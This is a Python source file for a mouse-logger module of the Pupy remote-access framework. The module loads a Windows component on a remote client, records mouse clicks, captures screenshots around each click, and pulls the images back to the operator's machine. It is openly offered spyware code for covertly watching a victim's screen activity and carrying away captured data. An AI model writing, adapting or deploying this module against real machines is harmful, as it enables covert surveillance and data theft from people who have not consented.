# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.

from pupylib.PupyModule import *
import logging
import traceback
import time
import os
import os.path
from pupylib.utils.rpyc_utils import obtain

def pil_save(filename, pixels, width, height):
	from PIL import Image, ImageFile
	buffer_len = (width * 3 + 3) & -4
	img = Image.frombuffer('RGB', (width, height), pixels, 'raw', 'BGR', buffer_len, 1)
	ImageFile.MAXBLOCK = width * height
	img=img.transpose(Image.FLIP_TOP_BOTTOM)
	img.save(filename, quality=95, optimize=True, progressive=True)

__class_name__="MouseLoggerModule"

class MouseLoggerModule(PupyModule):
	""" log mouse clicks and take screenshots of areas around it """
	# WARNING : screenshots are kept in memory before beeing dumped
	#TODO change that and add a callback to automatically send back screenshots without need for dumping
	daemon=True
	unique_instance=True

	def __init__(self, *args, **kwargs):
		PupyModule.__init__(self, *args, **kwargs)
		self.mouselogger=None

	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog='mouselogger', description=self.__doc__)
		self.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])

	@windows_only
	def is_compatible(self):
		pass

	def stop_daemon(self):
		self.success("mouselogger stopped")
		
	def run(self, args):
		try:
			os.makedirs(os.path.join("data","mouselogger"))
		except Exception:
			pass
		if args.action=="start":
			if self.mouselogger:
				self.error("the mouselogger is already started")
			else:
				self.client.load_package("pupwinutils.mouselogger")
				self.mouselogger=self.client.conn.modules["pupwinutils.mouselogger"].MouseLogger()
				self.mouselogger.start()
		else:
			if not self.mouselogger:
				self.error("the mouselogger is not running")
				return
			if args.action=="dump":
				self.success("dumping recorded mouse clicks :")
				screenshots_list=obtain(self.mouselogger.retrieve_screenshots())

				self.success("%s screenshots taken"%len(screenshots_list))
				print str(screenshots_list)[0:50]
				for d, height, width, buf in screenshots_list:
					filepath=os.path.join("data","mouselogger","scr_"+self.client.short_name()+"_"+str(d).replace(" ","_").replace(":","-")+".jpg")
					pil_save(filepath, buf, width, height)
					self.info("screenshot saved to %s"%filepath)
			elif args.action=="stop":
				self.mouselogger.stop()
				self.job.stop()



